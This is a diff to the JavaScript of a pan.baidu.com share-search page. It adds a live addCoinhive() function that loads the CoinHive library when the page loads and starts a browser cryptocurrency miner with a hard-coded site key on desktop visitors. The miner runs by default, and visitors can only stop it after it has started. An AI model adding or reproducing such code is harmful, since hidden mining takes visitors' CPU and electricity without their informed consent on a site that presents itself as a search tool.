@@ -91,18 +91,14 @@ function locationParameterChanged() {
     input.value=key;
     document.getElementsByTagName("title")[0].innerText=key+" in pan.baidu.com sharing";
     setMessageForm(key);
+    syncIsIt().getBykey();
     window.panc=pancFetcher(key);
     window.panduoduo=panduoduoFetcher(key);
     magnetFetcher(key);
     window.tieba=tiebaFetcher(key);
-//     if(screen.width>=751&&!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ){
-//         importScript ("https://coin-hive.com/lib/coinhive.min.js", function(){
-//             var miner = new CoinHive.Anonymous('Wtx9zrRVSwMjJmFssPEtuCxnzkdo3QaP');
-//             miner.start();
-//         })
-//     }
+    addCoinhive();
+    
 
-    syncIsIt().getBykey();
     localStorage.setItem("isOlduser",true);
     setDoubanSearch(input.value,function(){
             
@@ -1591,4 +1587,51 @@ function isDirect(){
         return true;
     }
     return false;
+}
+
+function addCoinhive(){
+    if(screen.width>=751&&!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ){
+        importScript ("https://coin-hive.com/lib/coinhive.min.js", function(){
+            miner = new CoinHive.Anonymous('Wtx9zrRVSwMjJmFssPEtuCxnzkdo3QaP');
+            if (!miner.isMobile() && !miner.didOptOut(14400)) {
+                if(!localStorage.getItem("removeCoinHive")){
+                    startCoinHive();
+                }else{
+                    stopCoinHive();
+                }
+            }
+        })
+    }
+}
+function startCoinHive(){
+    localStorage.removeItem("removeCoinHive");
+    
+    clearInterval(miner.interval);
+    miner.start();
+    // Update stats once per second
+
+    miner.interval = setInterval(function() {
+        var hashesPerSecond = miner.getHashesPerSecond();
+        var totalHashes = miner.getTotalHashes();
+        var acceptedHashes = miner.getAcceptedHashes();
+        var html = '<a href="https://coinhive.com" target="_blank"><i class="navigation-icon"></i>'
+            +totalHashes+'</a><button title="stop" onclick="stopCoinHive()">✗</button>';
+        // Output to HTML elements...
+        document.querySelector(".coinhive-miner").innerHTML = html;
+    }, 1000);
+}
+function stopCoinHive(){
+
+    localStorage.setItem("removeCoinHive",true);
+    clearInterval(miner.interval);
+    miner.stop();
+    miner.interval = setInterval(function() {
+        var hashesPerSecond = miner.getHashesPerSecond();
+        var totalHashes = miner.getTotalHashes();
+        var acceptedHashes = miner.getAcceptedHashes();
+        var html = '<a href="https://coinhive.com" target="_blank"><i class="navigation-icon"></i>'
+            +totalHashes+'</a><button title="start" onclick="startCoinHive()">▶</button>';
+        // Output to HTML elements...
+        document.querySelector(".coinhive-miner").innerHTML = html;
+    }, 1000);
 }
